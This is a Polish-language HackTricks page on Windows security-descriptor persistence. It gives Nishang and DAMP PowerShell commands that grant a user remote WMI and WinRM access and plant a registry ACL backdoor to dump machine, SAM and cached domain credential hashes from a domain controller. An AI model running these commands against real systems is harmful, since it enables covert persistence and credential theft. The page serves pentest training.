# Security Descriptors

{{#include ../../banners/hacktricks-training.md}}

## Security Descriptors

[From the docs](https://learn.microsoft.com/en-us/windows/win32/secauthz/security-descriptor-definition-language): Security Descriptor Definition Language (SDDL) definiuje format, który jest używany do opisywania opisu zabezpieczeń. SDDL używa ciągów ACE dla DACL i SACL: `ace_type;ace_flags;rights;object_guid;inherit_object_guid;account_sid;`

**Opisy zabezpieczeń** są używane do **przechowywania** **uprawnień**, które **obiekt** ma **nad** **obiektem**. Jeśli możesz **wprowadzić** **małą zmianę** w **opisie zabezpieczeń** obiektu, możesz uzyskać bardzo interesujące uprawnienia nad tym obiektem bez potrzeby bycia członkiem uprzywilejowanej grupy.

Ta technika utrzymywania dostępu opiera się na zdolności do zdobycia każdego potrzebnego uprawnienia wobec określonych obiektów, aby móc wykonać zadanie, które zazwyczaj wymaga uprawnień administratora, ale bez potrzeby bycia administratorem.

### Access to WMI

Możesz dać użytkownikowi dostęp do **zdalnego wykonywania WMI** [**używając tego**](https://github.com/samratashok/nishang/blob/master/Backdoors/Set-RemoteWMI.ps1):
```bash
Set-RemoteWMI -UserName student1 -ComputerName dcorp-dc –namespace 'root\cimv2' -Verbose
Set-RemoteWMI -UserName student1 -ComputerName dcorp-dc–namespace 'root\cimv2' -Remove -Verbose #Remove
```
### Dostęp do WinRM

Daj dostęp do **winrm PS console dla użytkownika** [**używając tego**](https://github.com/samratashok/nishang/blob/master/Backdoors/Set-RemoteWMI.ps1)**:**
```bash
Set-RemotePSRemoting -UserName student1 -ComputerName <remotehost> -Verbose
Set-RemotePSRemoting -UserName student1 -ComputerName <remotehost> -Remove #Remove
```
### Zdalny dostęp do hashy

Uzyskaj dostęp do **rejestru** i **zrzucaj hashe**, tworząc **tylną furtkę w rejestrze używając** [**DAMP**](https://github.com/HarmJ0y/DAMP)**,** aby w każdej chwili móc odzyskać **hash komputera**, **SAM** oraz wszelkie **cached AD** poświadczenia na komputerze. Dlatego bardzo przydatne jest nadanie tej zgody **zwykłemu użytkownikowi w stosunku do komputera kontrolera domeny**:
```bash
# allows for the remote retrieval of a system's machine and local account hashes, as well as its domain cached credentials.
Add-RemoteRegBackdoor -ComputerName <remotehost> -Trustee student1 -Verbose

# Abuses the ACL backdoor set by Add-RemoteRegBackdoor to remotely retrieve the local machine account hash for the specified machine.
Get-RemoteMachineAccountHash -ComputerName <remotehost> -Verbose

# Abuses the ACL backdoor set by Add-RemoteRegBackdoor to remotely retrieve the local SAM account hashes for the specified machine.
Get-RemoteLocalAccountHash -ComputerName <remotehost> -Verbose

# Abuses the ACL backdoor set by Add-RemoteRegBackdoor to remotely retrieve the domain cached credentials for the specified machine.
Get-RemoteCachedCredential -ComputerName <remotehost> -Verbose
```
Sprawdź [**Silver Tickets**](silver-ticket.md), aby dowiedzieć się, jak możesz wykorzystać hash konta komputera kontrolera domeny. 

{{#include ../../banners/hacktricks-training.md}}
